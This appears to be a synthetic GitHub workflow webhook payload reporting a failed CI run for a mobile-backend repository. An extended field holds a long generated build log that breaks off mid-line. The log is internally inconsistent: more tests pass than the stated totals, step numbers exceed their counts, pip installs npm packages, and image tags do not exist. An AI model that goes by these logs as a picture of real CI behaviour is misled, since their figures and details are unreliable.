{
  "action": "completed",
  "workflow_run": {
    "id": 631,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "1daf44838d008b12ca7d4ad894825f9f9c308848",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-12-07T12:19:25.622736Z",
    "updated_at": "2025-12-07T12:22:59.122351Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: lint ===\nBundling main.css\n[12:19:25] INFO: Cache refreshed\nCache restored successfully (135MB)\nCache saved successfully\n  PASS: integration/test_auth_login.spec.js\npip: Collecting webpack\nLoading...\nInstalling axios@2.14.8\nCompiling src/handler.rs...\nCoverage: 81% statements, 72% branches\n\u2713 All checks passed\nAlready up to date.\nStep 1/20: Linting\npip install: Successfully installed eslint-4.19\nTLS handshake completed\nChecking out master branch\nFetching submodules...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\nPushing to registry...\n[12:19:25] INFO: Cache refreshed\nReady.\nFinished.\nUsing Python 3.12\nLayer 8/13: COPY command\nPlatform: darwin-arm64\nGET /health - 200 (52ms)\nRan 177 tests in 45s\nConnecting to test.io:443...\npip: Collecting jest\n[12:19:25] DEBUG: Query executed in 71ms\nWARNING: webpack has known vulnerabilities\nChecking out main branch\nCache saved successfully\n[12:19:25] INFO: Request completed\n\u2713 All checks passed\nAlready up to date.\nOptimizing 57 modules...\nCompiling src/handler.rs...\nGET /api - 200 (43ms)\nGenerating source maps...\nCompiling src/main.py...\nChecking out develop branch\n[12:19:25] INFO: Starting build process\nTLS handshake completed\nUsing Node.js 17.9.9\nBuilding Docker image...\nPOST /upload - 200 (492ms)\n[12:19:25] INFO: Request completed\nHEAD is now at 8bf2cf6\nSwitched to branch 'feature/task-243'\nnpm notice: created a lockfile\nCache invalidated: node_modules\n[12:19:25] INFO: Connecting to database\nCache saved successfully\nCache invalidated: dependencies\nWARNING: axios has known vulnerabilities\nCache restored successfully (189MB)\n[12:19:25] DEBUG: Query executed in 56ms\n[12:19:25] INFO: Starting build process\nCache saved successfully\nNODE_ENV=production\nMinifying main.js\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\n[12:19:25] WARN: Deprecated API usage\nConnecting to startup.dev:443...\n\u2713 All checks passed\nRan 109 tests in 42s\nyarn add: Done in 30.51s\nStep 2/22: Running migrations\nOptimizing 65 modules...\nStep 1/25: Linting\nCache hit for key-3815\n[12:19:25] WARN: Deprecated API usage\nFinished.\nTest Suites: 24 passed, 6 total\n\u2717 build failed with exit code 101\nCompiling utils/service.java...\nTests: 237 passed, 426 total\nDone.\nCache restored successfully (187MB)\n[12:19:25] INFO: Starting build process\nUsing Node.js 15.8.9\nStep 2/23: Linting\npip: Collecting lodash\nMinifying main.js\nCoverage: 92% statements, 79% branches\nCompiling lib/utils.go...\n[12:19:25] WARN: Deprecated API usage\nCompiling utils/main.py...\nTransforming 597 files...\nProcessing...\npip: Installing build dependencies...\nConnecting to startup.dev:443...\nConnection established\nFetching submodules...\nConnection established\nStep 6/22: Linting\nArtifact downloaded: 20MB\n\u2713 All checks passed\npip install: Successfully installed eslint-4.5\nOK\nCompiling src/index.js...\nChecking out develop branch\nException: TypeError\nEnvironment: production\nFinished.\nConnection established\nCache restored successfully (196MB)\n  PASS: e2e/test_api_health.spec.js\nyarn add: Done in 8.77s\nPOST /upload - 201 (168ms)\nInstalling eslint@1.16.9\nPushing to registry...\nConnecting to startup.dev:443...\npip: Downloading prettier-3.1.tar.gz\npip: Installing build dependencies...\n\u2717 build failed with exit code 73\nLoading...\nCache restored successfully (488MB)\n\u2713 Step 'checkout' succeeded\nChecking out main branch\nCompiling lib/utils.go...\nCache saved successfully\nFetching submodules...\nHEAD is now at ea3fe69\nFetching submodules...\nTests: 91 passed, 392 total\nFetching submodules...\n=== Step lint completed ===\n=== Step: e2e_tests ===\nUsing Node.js 15.3.7\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 15.7.6\npip: Installing build dependencies...\nFetching submodules...\n[12:19:25] DEBUG: Initializing service\nStep 7/23: Deploying\n[12:19:25] ERROR: Connection failed\n  PASS: e2e/test_auth_login.spec.js\nTransforming 117 files...\npip install: Successfully installed lodash-3.7\nMinifying vendor.js\nProcessing...\nPlatform: linux-x64\nnpm notice: created a lockfile\nyarn add: Done in 10.70s\nCompiling utils/utils.go...\nSnapshots: 29 passed, 7 total\n[12:19:25] INFO: Connecting to database\n\u2713 Step 'checkout' succeeded\nPushing to registry...\npip install: Successfully installed axios-3.17\nFAILED: test_api_health\nCache invalidated: node_modules\nWARNING: lodash has known vulnerabilities\nStep 7/20: Linting\nVerifying...\nTLS handshake completed\nOptimizing 45 modules...\nPushing to registry...\n\u2713 All checks passed\nyarn add: Done in 16.72s\nInstalling jest@5.4.5\nTests: 246 passed, 235 total\nStep 1/19: Running migrations\nRan 77 tests in 55s\nyarn add: Done in 9.4s\nBuilding Docker image...\nBundling styles.js\nTransforming 859 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: dependencies\nStep 17/25: Building\n[12:19:25] INFO: Connecting to database\npip install: Successfully installed eslint-1.7\nArtifact uploaded: build.tar.gz (30MB)\nnpm install: resolved 1913 packages\nRan 56 tests in 59s\nCompiling src/utils.go...\nMinifying app.js\nStep 20/23: Testing\nnpm notice: created a lockfile\nStep 7/24: Building\nOptimizing 55 modules...\nTime: 21.745s\nCompiling components/main.py...\nPlatform: linux-x64\nUsing Python 3.10\nGET /health - 201 (20ms)\n[12:19:25] INFO: Request completed\nCache invalidated: build\nCompleted.\nPulling image: node:3.11\n\u2713 package completed\n[12:19:25] DEBUG: Loading configuration\nSnapshots: 6 passed, 36 total\npip: Collecting eslint\nConnection established\nBundling main.js\n\u2717 build failed with exit code 19\nCache hit for key-8070\npip: Collecting webpack\nPOST /api - 202 (140ms)\n\u2717 build failed with exit code 103\nFetching submodules...\nException: TypeError\nCompiling utils/index.js...\n\u2713 Task completed in 4121ms\nFetching submodules...\nLoading...\nConnection established\nArtifact uploaded: dist.zip (52MB)\nStep 20/23: Running migrations\n[12:19:25] DEBUG: Memory usage: 1902MB\nLoading...\n[12:19:25] INFO: Starting build process\nRan 154 tests in 5s\n[12:19:25] DEBUG: Connection pool: 2 active\nArtifact uploaded: dist.zip (45MB)\nDone.\npip: Collecting eslint\nCompiling utils/handler.rs...\nCompiling utils/app.ts...\n[12:19:25] WARN: Deprecated API usage\nCache saved successfully\n[12:19:25] DEBUG: Memory usage: 186MB\n  PASS: test_auth_login (396ms)\npip: Collecting webpack\nCreating production build...\nCache hit for key-4821\nnpm install: resolved 1512 packages\nBuilding Docker image...\nTransforming 407 files...\nArtifact uploaded: dist.zip (2MB)\nCompiling lib/handler.rs...\n[12:19:25] DEBUG: Loading configuration\nUsing Node.js 15.4.5\nWARNING: lodash has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nCache miss for key-3991\n  PASS: integration/test_user_create.spec.js\npip: Collecting express\nCompleted.\nnpm install: resolved 362 packages\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:25] INFO: Cache refreshed\nGET /api - 200 (78ms)\nAlready up to date.\nFAILED: test_auth_login\nGenerating source maps...\nDone.\nInstalling eslint@1.0.2\nStep 7/16: Installing dependencies\nFinished.\nTransforming 110 files...\nEnvironment: test\nStep 12/19: Deploying\nTime: 45.329s\nChecking out main branch\n=== Step e2e_tests completed ===\n=== Step: setup_node ===\nReady.\nDone.\nnpm install: added 27 packages\nSuccess!\npip install: Successfully installed axios-2.2\n[12:19:25] DEBUG: Query executed in 86ms\nOptimizing 69 modules...\npip: Installing build dependencies...\nVerifying...\nPOST /data - 202 (483ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnecting to cloud.services:443...\n[12:19:25] ERROR: Connection failed\nImage pulled successfully\nStep 6/20: Installing dependencies\nCache miss for key-8034\nLayer 3/8: ENV command\nWARNING: express has known vulnerabilities\n[12:19:25] INFO: Starting build process\n[12:19:25] DEBUG: Loading configuration\nStep 15/20: Building\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nProcessing...\nCache saved successfully\nProcessing...\nDone.\n[12:19:25] WARN: Deprecated API usage\n\u2713 All checks passed\nSwitched to branch 'bugfix/task-370'\n[12:19:25] DEBUG: Connection pool: 17 active\nArtifact uploaded: dist.zip (25MB)\n[12:19:25] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-229'\nArtifact uploaded: dist.zip (10MB)\nPOST /data - 201 (230ms)\nCache saved successfully\nCompiling utils/app.ts...\nArtifact uploaded: build.tar.gz (31MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 200 (374ms)\nCompiling lib/handler.rs...\nLoading...\nArtifact downloaded: 49MB\nCache miss for key-8169\nUsing Node.js 18.14.1\nFAILED: test_api_health\nHEAD is now at 56474d7\nStep 4/24: Deploying\n[12:19:25] WARN: Deprecated API usage\nNODE_ENV=production\nFinished.\nPlatform: linux-x64\nWARNING: jest has known vulnerabilities\nStep 3/17: Testing\nConnection established\nFinished.\n\u2717 build failed with exit code 59\n[12:19:25] INFO: Starting build process\n[12:19:25] INFO: Request completed\nCompleted.\npip install: Successfully installed react-3.12\n[12:19:25] ERROR: Connection failed\nyarn add: Done in 16.13s\nConnecting to startup.dev:443...\nnpm install: resolved 384 packages\nReady.\nCache miss for key-2911\nPulling image: node:latest\nCompiling src/app.ts...\n[12:19:25] DEBUG: Query executed in 2ms\nCache restored successfully (447MB)\nConnecting to test.io:443...\nArtifact downloaded: 25MB\npip: Installing build dependencies...\nConnecting to cloud.services:443...\n[12:19:25] DEBUG: Loading configuration\nPlatform: win32-x64\nLoading...\nWARNING: express has known vulnerabilities\nAlready up to date.\nPlatform: win32-x64\nConnecting to cloud.services:443...\npip: Installing build dependencies...\nArtifact downloaded: 47MB\nnpm install: added 390 packages\nConnecting to test.io:443...\nPulling image: alpine:18\npip: Installing build dependencies...\nUploading artifact 'dist' (37 files)\nLayer 9/12: COPY command\nChecking out master branch\n\u2713 test completed\nWARNING: jest has known vulnerabilities\n  PASS: test_auth_login (320ms)\nUsing Python 3.11\nCache restored successfully (146MB)\nnpm notice: created a lockfile\nCompiling lib/main.py...\nWARNING: axios has known vulnerabilities\nSwitched to branch 'hotfix/task-364'\nyarn add: Done in 23.61s\n[12:19:25] WARN: Deprecated API usage\nArtifact downloaded: 39MB\nPushing to registry...\n[12:19:25] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nnpm install: added 234 packages\nSuccess!\nCompiling src/main.py...\nCompiling utils/utils.go...\nProcessing...\nWARNING: eslint has known vulnerabilities\nHEAD is now at 9ede422\npip: Collecting axios\nTime: 71.801s\nLayer 3/13: RUN command\n[12:19:25] INFO: Starting build process\nStep 13/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nMinifying main.js\nPlatform: win32-x64\nInstalling eslint@4.7.2\npip: Downloading jest-2.18.tar.gz\nStep 1/16: Installing dependencies\nConnection established\nnpm install: added 205 packages\npip: Downloading jest-4.11.tar.gz\nTransforming 171 files...\n=== Step setup_node completed ===\n=== Step: build ===\nPlatform: linux-x64\nLayer 8/10: RUN command\nnpm notice: created a lockfile\nGET /health - 204 (29ms)\nGenerating source maps...\nPlatform: win32-x64\nPulling image: node:latest\n[12:19:25] INFO: Processing request\nOptimizing 12 modules...\nCoverage: 74% statements, 80% branches\nEnvironment: staging\nVerifying...\nStep 14/21: Running migrations\n[12:19:25] ERROR: Connection failed\nCompiling lib/index.js...\n[12:19:25] DEBUG: Connection pool: 19 active\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 18 tests in 53s\nReady.\nCompiling lib/index.js...\nUsing Node.js 19.1.6\nPulling image: python:latest\nEnvironment: test\n[12:19:25] DEBUG: Query executed in 49ms\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nStep 13/20: Building\nOptimizing 42 modules...\nGET /health - 201 (62ms)\nStep 7/15: Deploying\nTime: 16.327s\nInstalling prettier@3.11.9\nCache saved successfully\n[12:19:25] DEBUG: Loading configuration\n[12:19:25] DEBUG: Memory usage: 847MB\nGET /api - 200 (95ms)\n[12:19:25] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting jest\nFAILED: test_cache_hit\n[12:19:25] WARN: Deprecated API usage\nCache restored successfully (321MB)\nStep 16/18: Building\nArtifact uploaded: dist.zip (54MB)\nVerifying...\nGET /health - 200 (60ms)\nBuilding Docker image...\nTransforming 340 files...\nnpm install: added 478 packages\nLayer 10/11: COPY command\nCache hit for key-4126\nOptimizing 86 modules...\nCompiling components/main.py...\n\u2713 All checks passed\nStep 18/25: Deploying\npip: Installing build dependencies...\nPOST /api - 201 (329ms)\nLoading...\n[12:19:25] INFO: Connecting to database\n[12:19:25] WARN: Deprecated API usage\nnpm notice: created a lockfile\nException: TypeError\npip: Collecting eslint\nGET /status - 201 (59ms)\nTests: 425 passed, 392 total\nStep 10/20: Building\nCache saved successfully\n[12:19:25] DEBUG: Query executed in 9ms\n\u2713 Task completed in 3714ms\nInstalling webpack@3.1.9\nMinifying main.js\nnpm install: added 289 packages\nnpm install: added 426 packages\nDone.\n[12:19:25] DEBUG: Loading configuration\npip: Collecting axios\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\nnpm install: resolved 607 packages\nCompleted.\n[12:19:25] INFO: Cache refreshed\nArtifact downloaded: 34MB\n[12:19:25] INFO: Connecting to database\npip: Installing build dependencies...\nOK\nFetching submodules...\nCompiling utils/main.py...\nCompiling lib/utils.go...\nnpm install: resolved 1595 packages\nTests: 59 passed, 82 total\nStep 6/18: Installing dependencies\nnpm notice: created a lockfile\n[12:19:25] INFO: Starting build process\n[12:19:25] DEBUG: Query executed in 97ms\nArtifact uploaded: dist.zip (90MB)\nStep 14/20: Linting\n[12:19:25] DEBUG: Connection pool: 16 active\nUsing Python 3.11\nWARNING: jest has known vulnerabilities\npip: Collecting webpack\nFetching submodules...\nStep 11/15: Linting\npip: Collecting webpack\nStep 12/23: Linting\nnpm notice: created a lockfile\nBundling main.css\n\u2713 Step 'install' succeeded\nStep 11/24: Running migrations\nEnvironment: staging\nBuilding Docker image...\nUsing Python 3.9\n[12:19:25] DEBUG: Memory usage: 1623MB\nUsing Python 3.12\n[12:19:25] DEBUG: Connection pool: 20 active\nLayer 3/8: ENV command\npip: Installing build dependencies...\n[12:19:25] INFO: Connecting to database\nnpm install: added 87 packages\nArtifact downloaded: 13MB\nTest Suites: 34 passed, 9 total\n[12:19:25] DEBUG: Query executed in 70ms\n\u2713 All checks passed\nCoverage: 88% statements, 89% branches\nException: TypeError\nnpm notice: package.json updated\n\u2713 lint completed\nStep 19/17: Linting\nConnecting to test.io:443...\nStep 3/19: Installing dependencies\nDone.\nyarn add: Done in 4.95s\n=== Step build completed ===\n=== Step: type_check ===\nCompiling utils/service.java...\nArtifact uploaded: build.tar.gz (18MB)\nTLS handshake completed\n\u2717 build failed with exit code 36\n\u2713 Step 'setup' succeeded\nVerifying...\nStep 5/22: Deploying\nArtifact downloaded: 2MB\nLoading...\n[12:19:25] WARN: Deprecated API usage\nnpm install: added 485 packages\nLoading...\nFetching submodules...\n\u2713 All checks passed\npip: Installing build dependencies...\n[12:19:25] INFO: Request completed\n[12:19:25] DEBUG: Loading configuration\npip: Installing build dependencies...\nCreating production build...\nStep 16/21: Building\nnpm notice: created a lockfile\nRan 116 tests in 18s\n\u2713 All checks passed\nFAILED: test_cache_hit\nTests: 395 passed, 401 total\n[12:19:25] DEBUG: Connection pool: 20 active\nCompiling lib/service.java...\nStep 13/25: Running migrations\n[12:19:25] INFO: Connecting to database\n[12:19:25] INFO: Request completed\nnpm notice: created a lockfile\nArtifact downloaded: 43MB\nWARNING: react has known vulnerabilities\nCache miss for key-9173\nnpm install: added 22 packages\nException: ValueError\npip: Collecting express\nFinished.\nGET /api - 201 (94ms)\nnpm notice: created a lockfile\nImage pulled successfully\nWARNING: lodash has known vulnerabilities\npip: Collecting eslint\n[12:19:25] DEBUG: Initializing service\nPlatform: win32-x64\nChecking out main branch\nSwitched to branch 'bugfix/task-425'\nFetching submodules...\nTransforming 444 files...\nWARNING: lodash has known vulnerabilities\nUsing Node.js 19.11.0\nCache invalidated: node_modules\nChecking out develop branch\nnpm notice: package.json updated\nCache invalidated: dependencies\nHEAD is now at 465e3d7\nCompiling components/app.ts...\nCache saved successfully\nRan 128 tests in 17s\nMinifying vendor.js\nInstalling eslint@2.2.4\n[12:19:25] WARN: Deprecated API usage\nGET /status - 200 (99ms)\nFetching submodules...\n[12:19:25] INFO: Connecting to database\nCache saved successfully\nTransforming 337 files...\nStep 18/23: Building\nSwitched to branch 'feature/task-418'\nOK\nStep 9/17: Building\nCompiling utils/service.java...\n  PASS: test_db_connect (475ms)\n[12:19:25] WARN: Deprecated API usage\nCache miss for key-5090\nStep 5/23: Building\nTest Suites: 18 passed, 26 total\nCache invalidated: node_modules\nCreating production build...\nnpm notice: created a lockfile\n\u2713 build completed\n  PASS: integration/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nnpm install: resolved 1609 packages\nGenerating source maps...\n[12:19:25] DEBUG: Connection pool: 20 active\nSwitched to branch 'bugfix/task-483'\n\u2713 Step 'build' succeeded\nCoverage: 93% statements, 76% branches\nPOST /upload - 200 (142ms)\nBuilding Docker image...\nyarn add: Done in 12.87s\nArtifact uploaded: build.tar.gz (8MB)\nLoading...\n\u2713 Step 'test' succeeded\nStep 19/15: Linting\nCompiling components/main.py...\nStep 7/15: Installing dependencies\nConnecting to test.io:443...\nUsing Node.js 14.4.5\nUsing Python 3.11\nnpm install: added 393 packages\nStep 15/17: Deploying\n[12:19:25] INFO: Cache refreshed\nOptimizing 61 modules...\nHEAD is now at fa03270\nTransforming 695 files...\nLayer 4/15: ENV command\nAlready up to date.\n\u2713 Step 'build' succeeded\nStep 7/23: Testing\n[12:19:25] DEBUG: Initializing service\nEnvironment: staging\nProcessing...\nnpm notice: package.json updated\nStep 11/25: Building\nConnection established\n[12:19:25] DEBUG: Memory usage: 1327MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling react@3.15.0\nWaiting...\nStep 4/21: Building\n[12:19:25] WARN: Deprecated API usage\nUsing Node.js 20.13.0\nBuilding Docker image...\nConnecting to test.io:443...\nStep 8/24: Linting\nCompiling utils/utils.go...\nLayer 10/10: COPY command\nException: ValueError\nLayer 9/14: COPY command\n=== Step type_check completed ===\n=== Step: integration_tests ===\nBundling main.css\nCache restored successfully (179MB)\nUploading artifact 'dist' (19 files)\nStep 19/15: Testing\nCompiling src/handler.rs...\n[12:19:25] ERROR: Connection failed\nTLS handshake completed\n[12:19:25] DEBUG: Loading configuration\nTest Suites: 10 passed, 16 total\n\u2717 build failed with exit code 71\n[12:19:25] INFO: Connecting to database\nHEAD is now at 12b45e6\nStep 8/18: Linting\npip: Installing build dependencies...\nBuilding Docker image...\nBuilding Docker image...\n\u2713 lint completed\nStep 4/23: Testing\nCreating production build...\nUsing Node.js 19.19.9\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\nArtifact downloaded: 11MB\nStep 15/17: Running migrations\nBundling vendor.css\nnpm notice: package.json updated\nOK\n  PASS: e2e/test_api_health.spec.js\nTests: 296 passed, 379 total\nException: RuntimeError\nRan 31 tests in 23s\n\u2717 build failed with exit code 111\npip install: Successfully installed prettier-2.18\nCache saved successfully\nMinifying app.js\nCreating production build...\nUsing Node.js 19.1.1\nMinifying app.js\nPlatform: linux-x64\n  PASS: unit/test_user_create.spec.js\nPOST /upload - 200 (371ms)\n[12:19:25] DEBUG: Connection pool: 17 active\n[12:19:25] DEBUG: Loading configuration\n  PASS: integration/test_user_create.spec.js\npip: Downloading axios-2.9.tar.gz\nStep 3/24: Building\n\u2713 Step 'setup' succeeded\nTime: 50.505s\nPOST /data - 200 (402ms)\npip: Collecting lodash\n[12:19:25] WARN: Deprecated API usage\nDone.\nAlready up to date.\n\u2713 Task completed in 2884ms\nnpm notice: created a lockfile\nMinifying app.js\nTLS handshake completed\n  PASS: test_user_create (50ms)\n\u2713 Task completed in 2525ms\nNODE_ENV=development\nInstalling eslint@3.17.2\n[12:19:25] INFO: Connecting to database\npip: Installing build dependencies...\n[12:19:25] INFO: Processing request\nFAILED: test_cache_hit\nWaiting...\nnpm install: resolved 1688 packages\nArtifact uploaded: dist.zip (9MB)\n  PASS: integration/test_user_create.spec.js\nnpm notice: created a lockfile\nMinifying main.js\nImage pulled successfully\nLoading...\nWARNING: eslint has known vulnerabilities\nnpm notice: package.json updated\nFinished.\npip: Downloading jest-5.5.tar.gz\nPulling image: alpine:latest\nCompleted.\nFetching submodules...\nCache saved successfully\nDone.\nConnecting to startup.dev:443...\nInstalling webpack@1.12.3\nSnapshots: 39 passed, 30 total\nyarn add: Done in 18.96s\n\u2713 Step 'test' succeeded\n[12:19:25] INFO: Cache refreshed\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\n[12:19:25] INFO: Request completed\n[12:19:25] INFO: Cache refreshed\n[12:19:25] INFO: Processing request\n[12:19:25] ERROR: Connection failed\nMinifying main.js\nPOST /api - 200 (139ms)\n[12:19:25] DEBUG: Loading configuration\nCompleted.\nStep 15/16: Linting\n  PASS: integration/test_cache_hit.spec.js\n\u2713 All checks passed\nPulling image: python:3.11\nConnection established\nFetching submodules...\nException: NullPointerException\nInstalling express@3.17.4\n[12:19:25] DEBUG: Connection pool: 4 active\nSuccess!\nFetching submodules...\nCoverage: 97% statements, 66% branches\nCache invalidated: build\nImage pulled successfully\nPOST /api - 201 (371ms)\n[12:19:25] INFO: Connecting to database\nWARNING: react has known vulnerabilities\nStep 11/20: Linting\npip install: Successfully installed axios-4.6\nOK\n\u2713 Step 'checkout' succeeded\nOK\nStep 16/19: Deploying\nStep 11/24: Deploying\nStep 11/24: Testing\nOptimizing 71 modules...\n  PASS: e2e/test_db_connect.spec.js\nLoading...\nLayer 6/9: RUN command\nPushing to registry...\nImage pulled successfully\n  PASS: e2e/test_cache_hit.spec.js\nPlatform: darwin-arm64\nImage pulled successfully\n=== Step integration_tests completed ===\n=== Step: restore_cache ===\nOptimizing 70 modules...\n[12:19:25] WARN: Deprecated API usage\nnpm install: added 194 packages\nWaiting...\nStep 12/20: Installing dependencies\nPulling image: node:18\n[12:19:25] DEBUG: Initializing service\nUsing Python 3.9\n\u2717 build failed with exit code 1\nnpm install: added 278 packages\nCache restored successfully (377MB)\nTests: 172 passed, 177 total\nRan 184 tests in 53s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache restored successfully (327MB)\nBuilding Docker image...\nCache miss for key-4993\n[12:19:25] DEBUG: Query executed in 23ms\n[12:19:25] INFO: Cache refreshed\npip install: Successfully installed express-2.13\nTransforming 509 files...\nCache restored successfully (399MB)\nProcessing...\nGET /api - 201 (65ms)\nLayer 8/11: ENV command\npip: Installing build dependencies...\n[12:19:25] INFO: Processing request\nReady.\nStep 9/20: Testing\nWaiting...\nArtifact downloaded: 9MB\nBuilding Docker image...\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 20 passed, 42 total\nDone.\nOptimizing 51 modules...\nnpm install: resolved 1638 packages\nTests: 174 passed, 442 total\nHEAD is now at 1bde9a3\nPOST /data - 201 (390ms)\nnpm install: added 186 packages\nUploading artifact 'build' (15 files)\n\u2713 All checks passed\nnpm install: resolved 1079 packages\nStep 13/15: Deploying\nBuilding Docker image...\nStep 15/21: Linting\nLayer 10/10: ENV command\nArtifact downloaded: 31MB\n\u2717 build failed with exit code 63\nException: TypeError\nLoading...\nStep 18/18: Linting\n  PASS: test_user_create (436ms)\nSwitched to branch 'bugfix/task-113'\nFinished.\nPlatform: linux-x64\n[12:19:25] DEBUG: Memory usage: 1741MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=test\nWaiting...\nTests: 194 passed, 424 total\n[12:19:25] INFO: Processing request\nnpm notice: package.json updated\npip: Collecting webpack\nSnapshots: 9 passed, 22 total\nStep 3/17: Building\n[12:19:25] INFO: Cache refreshed\nCompiling src/handler.rs...\n[12:19:25] INFO: Cache refreshed\nSuccess!\nStep 20/23: Running migrations\nCache hit for key-8265\nCompiling lib/main.py...\nCache restored successfully (290MB)\nTransforming 887 files...\nEnvironment: staging\nSwitched to branch 'hotfix/task-275'\nReady.\npip: Collecting lodash\nStep 7/15: Running migrations\n[12:19:25] INFO: Cache refreshed\nTests: 160 passed, 340 total\nLoading...\nCache hit for key-1520\nCache invalidated: dependencies\nTest Suites: 23 passed, 16 total\nRan 23 tests in 14s\nTransforming 189 files...\nArtifact uploaded: build.tar.gz (39MB)\nConnection established\nSnapshots: 33 passed, 25 total\nArtifact downloaded: 44MB\nEnvironment: production\nException: ValueError\nRan 37 tests in 57s\nException: RuntimeError\n[12:19:25] INFO: Connecting to database\n[12:19:25] INFO: Starting build process\nAlready up to date.\nnpm notice: package.json updated\n\u2717 build failed with exit code 26\nRan 162 tests in 47s\nSnapshots: 36 passed, 23 total\nnpm notice: created a lockfile\nReady.\nCompiling components/main.py...\nConnecting to startup.dev:443...\npip: Collecting axios\nCompiling lib/utils.go...\n[12:19:25] DEBUG: Query executed in 49ms\nGenerating source maps...\nFinished.\nVerifying...\nCompleted.\npip: Downloading lodash-2.19.tar.gz\n[12:19:25] INFO: Cache refreshed\nCache saved successfully\nCreating production build...\n[12:19:25] INFO: Connecting to database\nCompiling lib/utils.go...\nUploading artifact 'build' (3 files)\nChecking out main branch\nTests: 286 passed, 343 total\nLayer 8/11: RUN command\n[12:19:25] DEBUG: Initializing service\nCompleted.\nStep 1/22: Testing\nGenerating source maps...\n\u2713 deploy completed\nBuilding Docker image...\n=== Step restore_cache completed ===\n=== Step: install_dependencies ===\nGenerating source maps...\nCache miss for key-9157\n[12:19:25] INFO: Starting build process\n\u2713 All checks passed\nFAILED: test_auth_login\nAlready up to date.\nWaiting...\nFinished.\nReady.\npip: Collecting jest\npip install: Successfully installed jest-1.17\nOptimizing 94 modules...\nInstalling webpack@1.5.10\nBundling styles.js\nInstalling express@2.12.1\n[12:19:25] DEBUG: Connection pool: 8 active\nWARNING: lodash has known vulnerabilities\n[12:19:25] WARN: Deprecated API usage\nTransforming 936 files...\nRan 19 tests in 17s\nStep 4/25: Testing\nProcessing...\nArtifact downloaded: 3MB\nTest Suites: 20 passed, 34 total\nEnvironment: development\n[12:19:25] WARN: Deprecated API usage\nFinished.\nStep 9/25: Testing\n[12:19:25] ERROR: Connection failed\nAlready up to date.\nArtifact uploaded: build.tar.gz (47MB)\n[12:19:25] INFO: Starting build process\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 3287ms\nCache invalidated: node_modules\n  PASS: test_auth_login (470ms)\nInstalling prettier@5.9.6\nImage pulled successfully\nWARNING: eslint has known vulnerabilities\n\u2713 All checks passed\nArtifact uploaded: dist.zip (88MB)\nVerifying...\n\u2713 Task completed in 2251ms\nFAILED: test_cache_hit\n\u2713 Step 'test' succeeded\nStep 14/24: Deploying\nUsing Node.js 19.7.7\nChecking out master branch\npip install: Successfully installed react-3.17\n[12:19:25] DEBUG: Loading configuration\nStep 18/17: Deploying\n[12:19:25] DEBUG: Memory usage: 204MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/23: Deploying\nHEAD is now at 1333758\n[12:19:25] INFO: Processing request\n  PASS: integration/test_api_health.spec.js\nDone.\nUploading artifact 'coverage' (23 files)\nLayer 8/8: RUN command\nStep 11/17: Installing dependencies\nImage pulled successfully\nTransforming 245 files...\nFinished.\n[12:19:25] WARN: Deprecated API usage\n  PASS: test_cache_hit (441ms)\n\u2713 Task completed in 337ms\nDone.\npip install: Successfully installed react-4.17\nCache invalidated: dependencies\nNODE_ENV=development\nCompiling src/utils.go...\nRan 142 tests in 28s\n[12:19:25] INFO: Processing request\nConnection established\n[12:19:25] INFO: Connecting to database\nImage pulled successfully\nCache hit for key-2432\nStep 4/18: Deploying\nInstalling lodash@5.15.3\n\u2713 Step 'setup' succeeded\nSwitched to branch 'bugfix/task-253'\n[12:19:25] INFO: Starting build process\nnpm notice: created a lockfile\nnpm install: added 137 packages\nPushing to registry...\nnpm notice: created a lockfile\nPulling image: python:18\n[12:19:25] INFO: Cache refreshed\n[12:19:25] DEBUG: Memory usage: 1200MB\n[12:19:25] DEBUG: Connection pool: 19 active\n[12:19:25] ERROR: Connection failed\n\u2713 Task completed in 4810ms\nWARNING: axios has known vulnerabilities\nnpm install: added 213 packages\nAlready up to date.\n  PASS: unit/test_db_connect.spec.js\nWaiting...\nCompiling utils/handler.rs...\nConnecting to test.io:443...\nBundling runtime.css\nChecking out master branch\nStep 4/15: Deploying\n[12:19:25] WARN: Deprecated API usage\nStep 15/15: Deploying\nReady.\nStep 10/16: Running migrations\n\u2717 build failed with exit code 75\nLayer 10/13: COPY command\nStep 14/22: Testing\nFAILED: test_auth_login\nUsing Python 3.12\nInstalling webpack@1.1.3\nCache miss for key-8895\nCreating production build...\nException: TypeError\nLayer 3/11: RUN command\nCompleted.\nSuccess!\nFAILED: test_user_create\nCache hit for key-4147\nAlready up to date.\nArtifact uploaded: build.tar.gz (14MB)\nUploading artifact 'coverage' 